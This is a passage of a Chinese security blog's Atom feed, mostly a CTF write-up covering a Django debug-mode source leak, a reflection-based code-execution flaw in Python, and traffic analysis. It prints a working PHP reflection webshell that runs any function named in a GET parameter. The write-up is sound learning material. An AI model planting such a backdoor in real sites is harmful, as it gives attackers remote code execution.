    <![CDATA[<h2 id="前言">前言</h2><p>大家对支付漏洞的理解通常都是篡改价格，已有的对支付漏洞的总结也是对现有的一些案例的经验式归类，没有上升到对在线支付流程深入分析的一个层面。这里尝试从分析在线支付流程，在线支付厂商的接入方式开始，深入业务分析整个在线交易流程中容易出现的安]]>
    </summary>
    
      <category term="支付漏洞" scheme="http://xdxd.love/tags/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="黑盒测试" scheme="http://xdxd.love/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[华山杯CTF做过的几道题]]></title>
    <link href="http://xdxd.love/2015/11/23/%E5%8D%8E%E5%B1%B1%E6%9D%AFCTF%E5%81%9A%E8%BF%87%E7%9A%84%E5%87%A0%E9%81%93%E9%A2%98/"/>
    <id>http://xdxd.love/2015/11/23/华山杯CTF做过的几道题/</id>
    <published>2015-11-23T08:04:35.000Z</published>
    <updated>2015-11-24T03:27:38.000Z</updated>
    <content type="html"><![CDATA[<p>花时间做了几道题，感觉还是有收获的。虽然死亡之ping这些知识点不熟悉，web的python题还是学到了不少知识。</p>
<p>登录的时候会随机报错。查看返回django的调试模式泄露源码。</p>
<p><img src="/images/huashanctf1.png" alt=""></p>
<p>通过改变参数多次尝试报错，可以或得部分代码：</p>
<pre><code>c = json.loads(request.body)
<span class="keyword">method</span> = getattr(globals()[c['obj']],c['<span class="keyword">method</span>'])
ret = <span class="keyword">method</span>(c['params'])
retdata['<span class="literal">result</span>'],retdata['error'] = ret
</code></pre><p>通过反射的方式来执行对象的函数，而ojb，method和params三个参数都是可控的，这样就可以导致代码执行。具体可以参考<a href="http://www.secpulse.com/archives/40012.html" target="_blank" rel="external">writeup</a></p>
<p>python <a href="http://stackoverflow.com/questions/12693606/reason-for-globals-in-python" target="_blank" rel="external">globals()</a>返回一个map，这个map的key是全局范围内对象的名字，value是该对象的实例。</p>
<p>利用php的反射写的后门如下：</p>
<pre><code><span class="php"><span class="preprocessor">&lt;?php</span>
    <span class="variable">$func</span> = <span class="keyword">new</span> ReflectionFunction(<span class="variable">$_GET</span>[m]);
    <span class="keyword">echo</span> <span class="variable">$func</span>-&gt;invokeArgs(<span class="keyword">array</span>(<span class="variable">$_GET</span>[c]));
<span class="preprocessor">?&gt;</span></span>
</code></pre><p>可以参考<a href="https://github.com/tennc/webshell/tree/master/php/p2j" target="_blank" rel="external">php反射后门</a></p>
<p>还有做的两个题就是分析流量。感觉还是比较有意思，在网络包种寻找信息，有点侦探的感觉。一个tips就是发现base64编码的密码，使用burpsuite的decode解码base64是乱码，以为不是base64，卡半天想不出来。其实是因为是中文做的base64编码，使用在线的base64解码工具可以直接解出中文。看来以前很多看起来像base64，但是decode是乱码，很可能是因为编码不对啊。<a href="http://sudalover.com/?p=155" target="_blank" rel="external">writeup</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>花时间做了几道题，感觉还是有收获的。虽然死亡之ping这些知识点不熟悉，web的python题还是学到了不少知识。</p>
<p>登录的时候会随机报错。查看返回django的调试模式泄露源码。</p>
<p><img src="/images/huashanctf1.png]]>
    </summary>
    
      <category term="ctf" scheme="http://xdxd.love/tags/ctf/"/>
    
      <category term="黑盒测试" scheme="http://xdxd.love/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
